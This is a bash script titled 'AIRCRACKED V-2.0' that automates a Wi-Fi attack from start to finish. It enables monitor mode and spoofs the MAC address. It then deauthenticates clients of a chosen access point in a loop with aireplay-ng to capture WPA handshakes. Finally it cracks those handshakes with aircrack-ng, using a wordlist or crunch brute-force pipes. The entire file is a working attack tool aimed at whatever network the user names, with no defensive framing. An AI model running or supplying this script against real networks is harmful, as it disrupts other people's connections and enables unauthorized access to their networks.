#!/bin/bash

clear
echo ""

#Configuration:

HANDSHAKE='/root/Handshakes/HandShake*.cap'
WORDLIST='/home/freeman/.wordlists/list1.txt'
MONITER=mon0

#End configuration

echo "***************************************"
echo "***********AIRCRACKED V-2.0************"
echo "***************************************"
echo "**                                   **"
echo "**  Wrtten by @thisguysayswht        **"
echo "**  Email: hofmanjosh555@yahoo.com   **"
echo "**                                   **"
echo "**  Usage:                           **"
echo "**                                   **"
echo "**  Starts moniter interface         **"
echo "**  Spoofs MAC adderss               **"
echo "**  Runs airodump-ng                 **"
echo "**  Creates Handshake directory      **"
echo "**  Dumps specified network traffic  **"
echo "**  Deauthenticates specified AP     **"
echo "**  Captures handshake               **"
echo "**  Restores wireless interfaces     **"
echo "**  Runs aircrack-ng                 **"
echo "**                                   **" 
echo "***************************************"
echo "***************************************"
echo ""
echo ""
echo "========Press enter to continue========"
read START
if [[ $START == "" ]]; then
sleep 2
clear
fi

#Use at your own risk...

echo "---------------------------------------------------"
echo "-Would you like to start a moniter interface[y/n]?-"
echo "---------------------------------------------------"
echo ""
read MONIF

if [[ $MONIF == 'y' ]]; then
echo ""
iwconfig
echo "Please select a wireless interface from above"
echo ""
read WIRELESS
[[ $WIRELESS == "" ]]
sleep 2
clear
echo "Starting interface on $WIRELESS..."
sleep 2
airmon-ng start $WIRELESS
sleep 4
clear
else
echo ""
echo "Skipping..."
sleep 2
clear
fi

echo "----------------------------------------"
echo "-Would you like to spoof your MAC[y/n]?-"
echo "----------------------------------------"
echo ""
read MACSPF

if [[ $MACSPF == 'y' ]]; then
echo ""
echo "Shutting down all wireless interfaces..."
echo ""
sleep 2
ifconfig $WIRELESS down
ifconfig $MONITER down
echo "Changing to random MAC..."
echo ""
sleep 2
macchanger -r $WIRELESS 
macchanger -r $MONITER
echo ""
echo "Bringing spoffed interfaces up..."
echo ""
sleep 4
clear
ifconfig $WIRELESS up
ifconfig $MONITER up
else
echo ""
echo "Skipping..."
sleep 2
clear
fi

while true
do
clear
echo "--------------------------------------------------"
echo "-Would you like to dump the network traffic[y/n]?-"
echo "--------------------------------------------------"
echo ""
read DUMP
if [[ $DUMP == 'y' ]]; then
echo ""
echo "Dumping network traffic...[Ctrl-C to stop]"
sleep 4
airodump-ng $MONITER
else
echo ""
echo "Skipping..."
sleep 2
clear
fi

echo "---------------------------------------------"
echo "-Would you like to capture a handshake[y/n]?-"
echo "---------------------------------------------"
echo ""
read HANDC

if [[ $HANDC == 'y' ]]; then
echo ""
echo "Creating directory Handshakes..."
echo ""
sleep 2
cd ~
mkdir Handshakes &> /dev/null
echo ""
echo "Please enter the network BSSID:"
echo ""
read BSSID
[[ $BSSID == "" ]]
echo ""
echo "Please enter the network channel:"
echo ""
read CHNEL
[[ $CHNEL == "" ]]
airodump-ng --ig -w Handshakes/HandShake -c $CHNEL --bssid $BSSID $MONITER &
sleep 6 &&
xterm -hold -e "while true; do sleep 5; aireplay-ng -0 5 -q 2 --ig -a $BSSID $MONITER; done" &&
exec -c
clear
else
echo ""
echo "Skipping..."
sleep 2
clear
fi

echo "---------------------------------------------------"
echo "-Would you like to capture another handshake[y/n]?-"
echo "---------------------------------------------------"
echo ""
read AGAIN

if [[ $AGAIN == "n" ]]; then
break
echo ""
echo "Skipping..."
sleep 2
clear
fi

done
clear
echo "-----------------------------------------------------------------------"
echo "-Would you like to restore your previous interface configuration[y/n]?-"
echo "-----------------------------------------------------------------------"
echo ""
read RESTOR

if [[ $RESTOR == "y" ]]; then
echo ""
echo "Disabling moniter mode..."
sleep 2
airmon-ng stop $MONITER
echo "Shutting down main wireless interface..."
echo ""
sleep 2
ifconfig $WIRELESS down
echo "Restoring perment MAC..."
echo ""
sleep 2
macchanger -p $WIRELESS
echo ""
echo "Bringing main wireless interface back up..."
echo ""
sleep 2
ifconfig $WIRELESS up
echo "Wireless interfaces restored"
echo ""
sleep 4
clear
else
echo ""
echo "Skipping..."
sleep 2
clear
fi

while true
do
clear
echo "*****************************************************"
echo "*******************Select option*********************"
echo "*****************************************************"
echo "**                                                 **"
echo "** 1. View handshakes             (Ctrl-C to exit) **"
echo "** 2. Use WORDLIST                                 **"
echo "** 3. Bruteforce 8 numeric        (1 day 6 hrs)    **"
echo "** 4. Bruteforce 9 numeric        (12 days)        **"
echo "** 5. Bruteforce 10 numeric       (4 months)       **"
echo "** 6. Bruteforce 8 a-z            (7 years)        **"
echo "** 7. Bruteforce 8 A-Z            (7 years)        **"
echo "** 8. Bruteforce 8 a-z + numeric  (91 years)       **"
echo "** 9. Bruteforce 8 A-Z + numeric  (91 years)       **"
echo "** 10. Bruteforce 8 a-z + A-Z     (1719 years)     **"
echo "** 11. Bruteforce custom          (???)            **"
echo "**                                                 **"
echo "*****************************************************"
echo "**********All calculations done @1000 pmk/s**********"
echo "*****************************************************"
echo ""

read n
case $n in
1)(xterm -hold -e aircrack-ng $HANDSHAKE) & ;;

2)clear
##echo "Decompressing rockyou.txt..."
##gunzip /usr/share/wordlists/rockyou.txt.gz &> /dev/null
##echo ""
##sleep 2
echo "Starting attack..."
sleep 3
aircrack-ng -w $WORDLIST $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

3)clear
echo "Enter the BSSID of the network you wish to attack"
echo ""
read FKUAC
[[ $FKUAC == "" ]]
echo "Starting bruteforce 8 numeric"
echo ""
crunch 8 8 1234567890|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

4)clear
echo "Enter the BSSID of the network you wish to attack"
echo ""
read FKUAC
[[ $FKUAC == "" ]]
echo "Starting bruteforce 9 numeric"
echo ""
crunch 9 9 1234567890|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

5)clear
echo "Enter the BSSID of the network you wish to attack"
echo ""
read FKUAC
[[ $FKUAC == "" ]]
echo "Starting bruteforce 10 numeric"
echo ""
crunch 10 10 1234567890|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

6)clear
echo "Enter the BSSID of the network you wish to attack"
echo ""
read FKUAC
[[ $FKUAC == "" ]]
echo "Starting bruteforce 8 a-z"
echo ""
crunch 8 8 abcdefghijklmnopqrstuvwxyz|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

7)clear
echo "Enter the BSSID of the network you wish to attack"
echo ""
read FKUAC
[[ $FKUAC == "" ]]
echo "Starting bruteforce 8 A-Z"
echo ""
crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

8)clear
echo "Enter the BSSID of the network you wish to attack"
echo ""
read FKUAC
[[ $FKUAC == "" ]]
echo "Starting bruteforce 8 a-z numeric"
echo ""
crunch 8 8 abcdefghijklmnopqrstuvwxyz1234567890|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

9)clear
echo "Enter the BSSID of the network you wish to attack"
echo ""
read FKUAC
[[ $FKUAC == "" ]]
echo "Starting bruteforce 8 A-Z numeric"
echo ""
crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

10)clear
echo "Enter the BSSID of the network you wish to attack"
echo ""
read FKUAC
[[ $FKUAC == "" ]]
echo "Starting bruteforce 8 a-z A-Z"
echo ""
crunch 8 8 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

11)clear
echo "Enter the BSSID of the network you wish to attack"
echo ""
read FKUAC
[[ $FKUAC == "" ]]
echo "What arguments would you like to pass to crunch?"
echo ""
read CRUNCH
[[ $CRUNCH == "" ]]
echo ""
echo "Starting custom bruteforce attack"
echo ""
crunch $CRUNCH|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE
echo ""
read -p "Press any key to return to script";;

*)clear
echo "Invalid option"
echo ""
read -p "Press any key to return to script";;

esac
sleep 1
done